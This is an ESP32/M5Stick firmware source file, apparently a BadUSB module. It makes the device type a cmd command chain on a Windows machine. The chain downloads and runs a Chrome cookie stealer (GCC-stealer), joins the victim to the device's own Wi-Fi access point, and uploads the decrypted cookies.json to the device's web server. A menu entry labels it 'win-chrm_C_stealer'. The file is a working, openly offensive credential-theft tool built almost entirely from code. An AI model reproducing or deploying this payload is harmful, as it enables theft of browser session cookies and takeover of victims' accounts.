#include <FS.h>
#include <WiFi.h>
#include <HTTPClient.h>
#include <WiFiMulti.h>
#include <WiFiClientSecure.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <ESPAsyncWebServer.h>
USBHIDKeyboard Keyboard;
const int buttonPin = 0;
bool screen_dim_dimmedL = false;
int screen_dim_timeL = 30;
int screen_dim_currentL = 0;
String full_files_dir = "/win-chrome/";
String files_dir = "/win-chrome";
String ssid = String("AP-0");
String password = String("decrypted-cookies");
File root;

AsyncWebServer server(80);

struct MENUL {
  char name[19];
  int command;
};

void demo_android(){ // 2
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("android demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

void demo_ios(){ // 3
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("ios demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

void demo_macos(){ // 4
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("macos demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

void demo_windows(){ // 5
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("windows demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

bool createDir(fs::FS &fs, const char * path){
  Serial.printf("Creating Dir: %s\n", path);
  if(fs.mkdir(path)){
    Serial.println("Dir created/exists");
    return true;
  } else {
    Serial.println("mkdir failed");
    return false;
  }
}

String ip2String(const IPAddress& address){
  return String() + address[0] + "." + address[1] + "." + address[2] + "." + address[3];
}

String printDirectory_listing(File dir, int numTabs) {
  String response = "";
  dir.rewindDirectory();
  
  while(true) {
     File entry =  dir.openNextFile();
     if (!entry) {
       // no more files
       //Serial.println("**nomorefiles**");
       break;
     }
     for (uint8_t i=0; i<numTabs; i++) {
       Serial.print('\t');   // we'll have a nice indentation
     }
     // Recurse for directories, otherwise print the file size
     if (entry.isDirectory()) {
       printDirectory_listing(entry, numTabs+1);
     } else {
       response += String("<a href='") + String(entry.name()) + String("'>") + String(entry.name()) + String("</a>") + String("</br>");
     }
     entry.close();
   }

   return String("List files in <b>/</b>win-chrome:<br>") + response;
}

String filename_exists(String filename, int count, String filename_original){
  if(SD.exists(full_files_dir+filename)){
    count++;
    char snum[5];
    // Convert 123 to string [buf]
    itoa(count, snum, 10);
    return filename_exists(snum+String("-")+filename_original, count, filename_original);
  } else {
    return filename;
  }
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
  String logmessage = "Client:" + request->client()->remoteIP().toString() + " " + request->url();
  Serial.println(logmessage);
  String filename_copy = filename;
  if (!index) {
    String toUpload = filename_exists(filename, 0, filename);
    logmessage = "Upload Start: " + String(filename);
    // open the file on first call and store the file handle in the request object
    request->_tempFile = SD.open(full_files_dir+toUpload, FILE_WRITE);
    Serial.println(logmessage);
  }

  if (len) {
    // stream the incoming chunk to the opened file
    request->_tempFile.write(data, len);
    logmessage = "Writing file: " + String(filename) + " index=" + String(index) + " len=" + String(len);
    Serial.println(logmessage);
  }

  if (final) {
    logmessage = "Upload Complete: " + String(filename) + ",size: " + String(index + len);
    // close the file handle as the upload is now done
    request->_tempFile.close();
    Serial.println(logmessage);
    request->redirect("/");
  }
}

IPAddress runPayloadServer(){
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  DISP.println("AP: "+ssid);
  DISP.println("PSW: "+password);
  server.serveStatic("/", SD, full_files_dir.c_str());
  // Serve the HTML file as the default route
  server.on("/", [](AsyncWebServerRequest *request){
    root = SD.open(files_dir);
    String res = printDirectory_listing(root, 0);
    request->send(200, "text/html", res);
  });

  // Route to handle file upload
  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
        request->send(200);
      }, handleUpload);
  // Start server
  server.begin();

  DISP.println("HTTP server started");
  DISP.print("@ http://");
  DISP.print(IP);
  return IP;
}

void run_payload_setup(){
  Keyboard.begin();
  USB.begin();
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  IPAddress IP = runPayloadServer();
  String str = ip2String(IP);
  String cmd = "cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
  " && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe" \
  " && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml" \
  " && netsh wlan delete profile "+ssid+"" \
  " && netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\"" \
  " && netsh wlan connect name="+ssid+"" \
  " && .\\GCC-stealer.exe --json-file" \
  " && timeout /t 5" \
  " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
  " && netsh wlan disconnect & exit";

  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println("Runing payload...");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  delay(2000);   
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(cmd);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf(TXT_SEL_BACK);
}

void rootPayload0(){
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
      if(createDir(SD, PYLD_DIR)){
        run_payload_setup();
      } else {
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
        DISP.printf(TXT_SEL_BACK);
      }
    }
}

static MENUL bumenu[] = { // edit this to add payloads!
  { TXT_BACK, 0},
  { "win-chrm_C_stealer", 1},
  { "demo_android", 2},
  { "demo_ios", 3},
  { "demo_macos", 4},
  { "demo_windows", 5},
};

int bumenu_size = sizeof(bumenu) / sizeof (MENUL);

void payloads_menu(int option){ // edit this to add payloads!
    switch(option) {
      case 0:
        current_proc = 1;
        break;
      case 1:
        rootPayload0();
        break;
      case 2:
        demo_android();
        break;
      case 3:
        demo_ios();
        break;
      case 4:
        demo_macos();
        break;
      case 5:
        demo_windows();
        break;
    }
}

void drawmenuL() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = bumenu_size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < bumenu_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",bumenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < bumenu_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",bumenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

// Ignore...

// 24 - Bad USB
// 25 - Bad USB Wifi Scan
// 26 - Bad USB Wifi scan results
// 27 - Run Payload 0

#if false

int uptimeL(){
  return(int(millis() / 1000));
}

void screenBrightnessL(int bright){
  Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Axp.ScreenBreath(bright);
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
}

void dimtimerL(){
  if(screen_dim_dimmedL){
    screenBrightnessL(brightness);
    screen_dim_dimmedL = false;
  }
  screen_dim_currentL = uptimeL() + screen_dim_timeL + 2;
}

bool check_next_pressL(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')){
    // hack to handle the up arrow
    cursor = cursor - 2;
    dimtimerL();
    return true;
  }
  //M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
    dimtimerL();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_RST) == LOW){
    dimtimerL();
    return true;
  }
#endif
  return false;
}

bool check_select_pressL(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
    dimtimerL();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    dimtimerL();
    return true;
  }
#endif
  return false;
}

void run_payload_loop(){
  if (check_next_pressL()) {
    rstOverride = true;
    isSwitching = true;
    current_proc = 24;
  }
}

void busb_setup(){
  rstOverride = false;  
  cursor = 0;
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(PYLD_DWNLD);
  delay(2000);
}

void busb_loop(){
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(0, 0);
    DISP.println(TXT_WF_SCNING);
    wifict = WiFi.scanNetworks();
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.setCursor(0, 0);
    if(wifict > 0){
      isSwitching = true;
      current_proc=26;
    }
}

void busb_drawmenu() {
  char ssid[19];
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 4) {
    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.print(" ");
      DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for ( int i = 0 ; i < wifict ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.print(" ");
      DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
  if(cursor == wifict){
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(TXT_WF_RESCAN);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  if(cursor == wifict + 1){
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(String(TXT_BACK));
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

bool getPayload(String ssid, String password) {
  bool downloadOK = false;
  Serial.begin(115200);
  // Serial.setDebugOutput(true);
  Serial.println();
  Serial.println();
  Serial.println();

  WiFi.mode(WIFI_STA);
  DISP.print("Connecting to WiFi...");
  WiFi.begin(ssid, password);
  int count = 0;
  while (WiFi.status() != WL_CONNECTED)
  {
    if(count == 10){
      break;
    }
    delay(1000);
    count++;
  }
  if(count == 10 && WiFi.status() != WL_CONNECTED){
    DISP.println( " failed to connect.");
    WiFi.disconnect();
    return downloadOK;
  } else {
    DISP.println(" connected!");
  }

  File file = SD.open(PYLD_PATH, FILE_WRITE);

  if (!file) {
    DISP.println("Failed to open file for writing.");
    WiFi.disconnect();
    return downloadOK;
  }

  WiFiClientSecure *client = new WiFiClientSecure;
  if(client) {
    client -> setCACert(ROOT_CA_CRT);
    // Add a scoping block for HTTPClient https to make sure it is destroyed before WiFiClientSecure *client is 
    HTTPClient https;
    https.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    //DISP.print("[HTTPS] begin...\n");
    if (https.begin(*client, PYLD_RMT_PATH)) {  // HTTPS
      //DISP.print("[HTTPS] GET...\n");
      // start connection and send HTTP header
      int httpCode = https.GET();

      // httpCode will be negative on error
      if (httpCode > 0) {
        // HTTP header has been send and Server response header has been handled
        DISP.printf("[HTTPS] GET code %d\n", httpCode);
        // file found at server
        if (httpCode == HTTP_CODE_OK) {
          DISP.print("[HTTPS] GET downloading...");
          https.writeToStream(&file);
          DISP.println(" done!");
          downloadOK = true;
        }
      } else {
        DISP.printf("[HTTPS] GET... failed, error: %d\n", httpCode);
      }

      https.end();
    } else {
      DISP.printf("[HTTPS] Unable to connect\n");
    }
  }
  WiFi.disconnect();
  return downloadOK;
}

void busb_result_setup() {
  cursor = 0;
  rstOverride = true;
  busb_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void busb_result_loop(){
  if (check_next_pressL()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    busb_drawmenu();
    delay(250);
  }
  if (check_select_pressL()) {
    delay(250);
    bool home_or_rescan = false;
    if(cursor == wifict){
      rstOverride = false;
      current_proc = 25;
      home_or_rescan = true;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      current_proc = 24;
      home_or_rescan = true;
    }
    if(!home_or_rescan){
      String encryptType = "";
      switch (WiFi.encryptionType(cursor)) {
      case 1:
        encryptType = "WEP";
        break;
      case 2:
        encryptType = "WPA/PSK/TKIP";
        break;
      case 3:
        encryptType = "WPA/PSK/CCMP";
        break;
      case 4:
        encryptType = "WPA2/PSK/Mixed/CCMP";
        break;
      case 8:
        encryptType = "WPA/WPA2/PSK";
        break ;
      case 0:
        encryptType = TXT_WF_OPEN;
        break ;
      }
      DISP.fillScreen(BGCOLOR);
      DISP.setCursor(0, 0);
      DISP.setTextColor(BGCOLOR, FGCOLOR);
      if(WiFi.SSID(cursor).length() > 12){
        DISP.setTextSize(SMALL_TEXT);
      }else if(WiFi.SSID(cursor).length() > 20){
        DISP.setTextSize(TINY_TEXT);
      }else{
        DISP.setTextSize(MEDIUM_TEXT);
      }
      String currentPSWD = "";
      DISP.println(WiFi.SSID(cursor));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      DISP.setTextSize(SMALL_TEXT);
      DISP.printf(TXT_WF_CRYPT, encryptType);
      DISP.setTextSize(TINY_TEXT);
      DISP.println("\nType the Password");
      DISP.println("Press Enter to Confirm:");
      DISP.setTextSize(SMALL_TEXT);
      uint8_t pswdTextCursorY = DISP.getCursorY();
      DISP.printf("%s", currentPSWD.c_str());
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      bool pswd_ok = false;
      while(!pswd_ok){
        M5Cardputer.update();
        if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
          Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
          if(status.del) {
            currentPSWD.remove(currentPSWD.length() - 1);
          }
          if(status.enter) {
            pswd_ok = true;
          }
          for(auto i : status.word) {
              currentPSWD += i;
          }
          DISP.fillRect(0, pswdTextCursorY, DISP.width(), DISP.width()- pswdTextCursorY, BLACK);
          DISP.setCursor(0, pswdTextCursorY);
          DISP.printf("%s", currentPSWD.c_str());
        }
      }
      rstOverride = true;
      isSwitching = false;
      DISP.fillScreen(BGCOLOR);
      DISP.setCursor(0, 0);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      DISP.setTextSize(SMALL_TEXT);
      bool downloadOK = getPayload(WiFi.SSID(cursor), currentPSWD);
      if(downloadOK){
        DISP.println(TXT_HOLD_BACK);
        DISP.setTextColor(BGCOLOR, FGCOLOR);
        DISP.printf(TXT_RUN_PYLD);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        while(true){
          if(check_select_pressL()){
            isSwitching = true;
            current_proc = 27;
            delay(100);
            break;
          }
          if(check_next_pressL()){
            isSwitching = true;
            current_proc = 24;
            delay(100);
            break;
          }
          delay(1000);
        }
      } else {
        DISP.printf(TXT_SEL_BACK);
      }
    }
  }
}

void rootPayload0Old(){
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
      if(createDir(SD, PYLD_DIR)){
        bool exists = SD.exists(PYLD_PATH);
        int sz = 0;
        if(exists){
          File fp = SD.open(PYLD_PATH);
          sz = fp.size();
          fp.close();
        }
        if(exists && sz == PYLD_EXP_SIZE){
          // run payload
          //current_proc = 25;
          current_proc = 27;
        } else {
          current_proc = 25;
        }
        run_payload_setup();
      } else {
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
        DISP.printf(TXT_SEL_BACK);
      }
    }
}

#endif